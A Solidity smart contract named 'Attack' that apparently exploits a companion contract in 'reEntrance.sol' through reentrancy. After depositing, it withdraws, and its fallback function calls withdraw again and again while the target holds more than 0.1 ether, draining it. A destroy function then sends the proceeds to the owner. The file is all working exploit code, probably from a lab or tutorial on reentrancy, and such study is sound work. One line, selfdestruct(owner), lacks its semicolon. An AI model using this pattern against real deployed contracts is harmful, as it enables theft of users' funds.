pragma solidity >=0.6.1;
import "./reEntrance.sol";

contract Attack {
    ReEntrance reEntrance;
    address payable owner;
    constructor(address _reEntranceAddress) public {
        owner = msg.sender;
        reEntrance = ReEntrance(_reEntranceAddress);
    }
    function Deposit() public payable {
        reEntrance.deposit.value(msg.value)();
    }
    function callBackMagic(uint256 withdrawValue) public{
        reEntrance.withdraw(withdrawValue);
    }
    function destroy() public {
        require(msg.sender == owner);
        selfdestruct(owner)
    }
    fallback () payable external {
      if (address(reEntrance).balance > 0.1 ether) {
          reEntrance.withdraw(0.1 ether);
      }
  }
}